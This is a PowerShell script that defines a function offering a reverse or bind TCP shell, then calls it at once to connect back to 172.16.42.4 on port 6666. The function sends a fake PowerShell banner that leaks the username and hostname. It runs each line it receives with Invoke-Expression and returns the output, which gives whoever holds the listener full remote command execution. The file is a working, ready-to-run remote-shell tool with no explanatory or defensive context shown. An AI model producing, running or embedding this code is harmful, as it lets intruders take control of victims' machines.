function Invoke-PowerShellTcp {
    [CmdletBinding(DefaultParameterSetName="reverse")]
    Param(
        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]
        $IPAddress,
        
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int]
        $Port,
        
        [Parameter(ParameterSetName="reverse")]
        [Switch]
        $Reverse,
        
        [Parameter(ParameterSetName="bind")]
        [Switch]
        $Bind
    )
    
    try {
        if ($Reverse) {
            $client = New-Object System.Net.Sockets.TCPClient($IPAddress, $Port)
        }
        
        if ($Bind) {
            $listener = [System.Net.Sockets.TcpListener]::new($IPAddress, $Port)
            $listener.Start()
            $client = $listener.AcceptTcpClient()
        }
        
        $stream = $client.GetStream()
        $encoder = [Text.Encoding]::ASCII
        
        $welcomeMessage = "Windows PowerShell running as user $($env:username) on $($env:computername)`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n"
        $prompt = "PS $($(Get-Location).Path)> "
        
        $streamWriter = [IO.StreamWriter]::new($stream, $encoder)
        $streamReader = [IO.StreamReader]::new($stream, $encoder)
        
        $streamWriter.WriteLine($welcomeMessage)
        $streamWriter.Flush()
        
        while ($true) {
            $streamWriter.Write($prompt)
            $streamWriter.Flush()
            
            $command = $streamReader.ReadLine()
            
            if ($command -eq $null) {
                break
            }
            
            try {
                $output = Invoke-Expression -Command $command 2>&1
            } catch {
                $output = $_.Exception.Message
            }
            
            $streamWriter.WriteLine($output)
            $streamWriter.Flush()
        }
        
        $stream.Close()
        $client.Close()
        
        if ($listener) {
            $listener.Stop()
        }
    } catch {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port."
        Write-Error $_
    }
}

Invoke-PowerShellTcp -Reverse -IPAddress "172.16.42.4" -Port 6666
